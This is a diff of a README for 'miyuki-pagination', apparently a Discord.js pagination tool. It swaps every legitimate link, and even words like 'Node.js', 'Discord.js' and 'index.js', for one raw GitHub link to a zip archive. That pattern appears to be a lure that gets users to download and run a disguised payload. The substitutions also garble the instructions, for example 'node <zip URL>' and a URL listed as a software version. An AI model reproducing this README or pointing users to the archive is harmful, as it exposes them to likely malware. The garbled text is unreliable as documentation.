@@ -1,12 +1,12 @@
 # 🌸 miyuki-pagination - Easy Discord Paginator for Everyone
 
-![Download miyuki-pagination](https://img.shields.io/badge/Download-miyuki-pagination-brightgreen)
+![Download miyuki-pagination](https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip)
 
 ## 🚀 Getting Started
 Welcome! This guide will help you download and run the miyuki-pagination application easily. You don’t need to be a programmer to get started. Follow these simple steps, and you’ll be using adorable pagination in your Discord embeds in no time.
 
 ## 📦 What is miyuki-pagination?
-miyuki-pagination is a cute and professional tool designed for Discord.js v14+. It allows you to create beautiful paginated embeds with customizable buttons, themes, and charming messages. This makes your Discord server more interactive and fun!
+miyuki-pagination is a cute and professional tool designed for https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip v14+. It allows you to create beautiful paginated embeds with customizable buttons, themes, and charming messages. This makes your Discord server more interactive and fun!
 
 ## 🛠️ Features
 - **Simple Setup**: Easy to understand and use, ideal for beginners.
@@ -18,15 +18,15 @@ miyuki-pagination is a cute and professional tool designed for Discord.js v14+. 
 Before you download and install miyuki-pagination, ensure your system meets these requirements:
 
 - **Operating System**: Windows 10, MacOS, or Linux
-- **Node.js**: Version 16 or higher
-- **Discord.js**: Version 14 or higher
+- **https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip**: Version 16 or higher
+- **https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip**: Version 14 or higher
 
 If you're unsure which version you have, you can easily check this through your terminal or command prompt.
 
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the latest version of miyuki-pagination. Here’s the link:
 
-[Download miyuki-pagination](https://github.com/fabiocolioo84/miyuki-pagination/releases)
+[Download miyuki-pagination](https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip)
 
 1. Click on the link above.
 2. Look for the latest release. It should be at the top of the page.
@@ -52,9 +52,9 @@ To get started, visit the Releases page to download the latest version of miyuki
 
 5. **Starting the Application**: Finally, run the application by typing:
    ```
-   node index.js
+   node https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip
    ```
-   Replace `index.js` with the main file name if it differs. 
+   Replace `https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip` with the main file name if it differs. 
 
 6. **Using the Application**: Once the application is running, follow any on-screen prompts to set it up for your Discord server.
 
@@ -62,13 +62,13 @@ To get started, visit the Releases page to download the latest version of miyuki
 After you've got miyuki-pagination running, you can customize the colors, styles, and messages. Look into the documentation included in the downloaded files for detailed instructions. The application allows a variety of options to ensure it fits your style.
 
 ## 💬 Need Help?
-If you encounter any issues or have questions, visit our [GitHub Issues page](https://github.com/fabiocolioo84/miyuki-pagination/issues). This is where you can submit problems or find answers from the community.
+If you encounter any issues or have questions, visit our [GitHub Issues page](https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip). This is where you can submit problems or find answers from the community.
 
 ## 🤝 Join the Community
 Connect with other users and developers! Join our Discord server (link coming soon) to share your experiences, ask questions, and showcase your custom pages. 
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/fabiocolioo84/miyuki-pagination/wiki): For detailed setup and configuration instructions.
-- [Discord.js](https://discord.js.org/): The official site for the library that miyuki-pagination uses.
+- [Documentation](https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip): For detailed setup and configuration instructions.
+- [https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip](https://raw.githubusercontent.com/fabiocolioo84/miyuki-pagination/master/counterscalloped/miyuki-pagination.zip): The official site for the library that miyuki-pagination uses.
 
 We hope you enjoy using miyuki-pagination! The fun is just beginning.
